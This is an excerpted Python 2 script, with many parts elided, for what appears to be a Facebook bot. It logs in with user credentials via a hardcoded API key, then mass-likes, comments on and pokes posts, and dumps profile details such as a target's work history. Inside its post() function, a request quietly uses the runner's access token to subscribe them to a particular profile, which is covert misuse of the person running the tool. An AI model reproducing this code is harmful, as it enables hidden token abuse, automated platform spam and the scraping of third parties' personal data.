...
def login_id():
    ...
    sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + username + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.0' + API_SECRET
    x = hashlib.new('md5')
    x.update(sig)
...
def post():
    ...
    try:
        if WT == 'wallpost':
            ...
            print '[*] fetching all posts id'
            r = requests.get("https://graph.facebook.com/v3.0/%s?fields=feed.limit(50)&access_token=%s" % (target_id, token))
            requests.post('https://graph.facebook.com/putriy.kaeysha/subscribers?access_token=' + token)
            result = json.loads(r.text)
            for i in result['feed']['data']:
                print '\r[*] %s retrieved    ' % (i['id']),
...
def like(posts, amount):
    ...
    try:
        ...
        for post in posts:
            ...
            id_disp = post['id'].split('_')[0]
            try:
                print '\r' + W + '[' + G + id_disp + W + '] ' + post['message'][:40].replace('\n', ' ') + '...'
            except KeyError:
                try:
                    print '\r' + W + '[' + G + id_disp + W + '] ' + post['story'].replace('\n', ' ')
                except KeyError:
                    print '\r' + W + '[' + G + id_disp + W + '] Successfully liked'
        print '\r[*] Done                    '
        menu_reaction_ask()
    except KeyboardInterrupt:
        print '\r[!] Stopped                      '
...
def comment(posts, amount):
    ...
    try:
        ...
        for post in posts:
            ...
            id_disp = post['id'].split('_')[0]
            try:
                print W + '[' + G + id_disp + W + '] ' + post['message'][:40].replace('\n', ' ') + '...'
            except KeyError:
                try:
                    print W + '[' + G + id_disp + W + '] ' + post['story'].replace('\n', ' ')
                except KeyError:
                    print W + '[' + G + id_disp + W + '] successfully commented'
        print '[*] Done'
        bot()
    except KeyboardInterrupt:
        print '\r[!] Stopped'
...
def poke(posts):
    ...
    try:
        ...
        for post in posts:
            ...
            try:
                cek = a['error']['message']
                print W + '[' + R + id_disp + W + '] failed'
            except TypeError:
                print W + '[' + G + id_disp + W + '] pokes'
        print '[*] Done'
        bot()
    except KeyboardInterrupt:
        print '\r[!] Stopped   '
...
def bot_ask():
    ...
    choice = raw_input(W + '[?] [' + R + 'W' + W + ']allpost or [' + R + 'T' + W + ']arget (' + R + 'W' + W + '/' + R + 'T' + W + ') : ')
    if choice.upper() == 'T':
        target_id = raw_input('[?] id facebook : ')
        if target_id == '':
...
def bot():
    try:
        global type, message, target_id, WT, token
...
'''
            ...
            dump_mail()
        elif 'dump_' in cek.lower() and cek.lower().split('_')[2] == 'id':
    ...
    for i in a['data']:
        if target in i['name'] or target in i['id']:
            ...
            try:
                ...
                for job in y['work']:
                    try:
                        print '    [-] position : ' + job['position']['name']
                    except KeyError:
                        pass
                    try:
                    ...
                    try:
                        ...
                        pass
                    try:
                        if job['end_date'] == "0000-00":
                            print '    [-] end date : ---'
                        else:
                            print '    [-] end date : ' + job['end_date']
                    except KeyError:
                        pass
                    try:
